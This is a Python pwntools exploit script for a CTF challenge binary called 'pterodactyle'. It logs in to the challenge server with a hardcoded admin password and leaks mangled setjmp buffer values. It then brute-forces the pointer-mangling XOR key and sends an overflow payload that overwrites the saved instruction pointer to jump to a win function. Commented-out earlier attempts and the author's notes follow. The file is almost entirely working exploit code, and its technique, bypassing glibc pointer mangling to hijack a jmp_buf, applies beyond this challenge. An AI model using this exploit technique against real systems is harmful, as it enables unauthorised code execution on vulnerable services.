from pwn import *


HOST = ["challenges.france-cybersecurity-challenge.fr", 2102]
USERNAME = b"admin"
PASSWORD = b"MySeCr3TP4$$W0rd"

binary = ELF('./data/pterodactyle')

JMPBUF_RIP_OFFSET = 0x131f
WIN_OFFSET 		  = 0x1595

p = connect(HOST[0], HOST[1]) # process('./pterodactyle') #  


def login(user=USERNAME, password=PASSWORD):
	p.recvuntil(b">> ")
	p.sendline(b"1")
	p.recvuntil(b">> ")
	p.sendline(user)
	p.recvuntil(b">> ")
	p.sendline(password)


def leak_cookie():
	p.recvuntil(b">> ")
	p.sendline(b"2")
	p.recvuntil(b":-)\n")
	leaks = p.recvuntil(b"1: ")[:-3]  # removing "1: "
	addrs = [u64(leaks[i:i+8]) for i in range(0, len(leaks), 8)]
	return {
		"leak1": addrs[0],
		"rbp": addrs[1],
		"null1": addrs[2],
		"leak2": addrs[3],
		"null2": addrs[4],
		"leak3": addrs[5],
		"rsp": addrs[6],
		"rip": addrs[7]
	}

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
	(val << r_bits%max_bits) & (2**max_bits-1) | \
	((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
 
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
	((val & (2**max_bits-1)) >> r_bits%max_bits) | \
	(val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))


def calculate_xor_key(known, offset, enc):
	# enc ^ key = known + offset
	# (known+offset) ^ enc = key
	enc_phase1 = ror(enc, 17, 64)
	return (known + offset) ^ enc_phase1

def calculate_setjmp_addr(value, xor_key):
	return ror(value, 17, 64) ^ xor_key


input("Wait for debugger")
login()
leaks = leak_cookie()
for k, v in leaks.items():
	print(f"{k:5}  - 0x{v:016x}")

# POST-CTF NOTE : < I really brute forced a xor key...
# I just had to rip_enc ^ 0x31f to get the 3 last bytes of the xor key ahahah >

# Brute forcing last 3 bytes since we know that RIP[:-3] == 0x31f
print("Brute forcing 3 LSB xor key")
for xor_lsb in range(0x0, 0xfff):
	print(f"Testing 0x{xor_lsb:03x}...", end="\r")
	rip_phase1 = ror(leaks["rip"], 17, 64)
	if (rip_phase1 ^ xor_lsb) & 0xfff == 0x31f:
		print(f"\nFound match for xor key = 0x{xor_lsb:03x}")
		break
else:
	print("No match found")


win_phase1_lsb = 0x595 ^ xor_lsb

# replacing last 3 bytes
rip_phase1 = ror(leaks["rip"], 17, 64)
rip_to_str = hex(rip_phase1)[:-3]
rip_phase1_patched = int(rip_to_str + hex(win_phase1_lsb)[2:], 16)

print(f"win_enc value : {hex(rip_phase1_patched)}")
print("Sending payload...")

def prepare(value):
	final = b""
	for el in value:
		final += (el ^ 0x77).to_bytes(1, "big")
	return final

payload = b''.join([
	b'A'*32,
	prepare(p64(leaks['leak1'])),
	prepare(p64(leaks['rbp'])),
	prepare(p64(leaks['null1'])),
	prepare(p64(leaks['leak2'])),
	prepare(p64(leaks['null2'])),
	prepare(p64(leaks['leak3'])),
	prepare(p64(leaks['rsp'])),
	prepare(p64(rol(rip_phase1_patched, 17, 64))),

])

print("---------------------------")
login(payload)
p.interactive()


# Soooo this works in local, but in remote it seems we don't have leaks from get_cookie...

# print(f"Known leak : {hex(leaks['leak1'])}")
# print(f"enc   rip  : {hex(leaks['rip'])}")
# for count, i in enumerate(range(0x18, 0x308, 0x10)):
# 	xor_key = calculate_xor_key(leaks["leak1"], -i, leaks["rbp"])
# 	print(f"test nÂ°{count+1:02} : stack offset = -0x{i:02x}")
# 	if (calculate_setjmp_addr(leaks['rip'], xor_key) & 0xfff == 0x31f):
# 		print(f"FOUND !! <offset={i}> <xor_key={hex(xor_key)}>")
# 		break
# else:
# 	print("not found :-(")


# rip_leak  = calculate_setjmp_addr(leaks['rip'], xor_key)
# rbp_leak  = calculate_setjmp_addr(leaks['rbp'], xor_key)
# rsp_leak  = calculate_setjmp_addr(leaks['rsp'], xor_key)
# base_addr = rip_leak - JMPBUF_RIP_OFFSET
# win_addr  = base_addr + WIN_OFFSET

# print(f"RIP  leak : {hex(rip_leak)}")
# print(f"RBP  leak : {hex(rbp_leak)}")
# print(f"RSP  leak : {hex(rsp_leak)}")
# print(f"Base addr : {hex(base_addr)}")
# print(f"Win  addr : {hex(win_addr)}")

# # THIS WINS
# print("Sending payload...")
# def prepare(value):
# 	final = b""
# 	for el in value:
# 		final += (el ^ 0x77).to_bytes(1, "big")
# 	return final

# payload = b''.join([
# 	b'A'*32,
# 	prepare(p64(leaks['leak1'])),
# 	prepare(p64(leaks['rbp'])),
# 	prepare(p64(leaks['null1'])),
# 	prepare(p64(leaks['leak2'])),
# 	prepare(p64(leaks['null2'])),
# 	prepare(p64(leaks['leak3'])),
# 	prepare(p64(leaks['rsp'])),
# 	prepare(p64(rol(win_addr ^ xor_key, 17, 64))),

# ])

# print("---------------------------")
# login(payload)
# p.interactive()
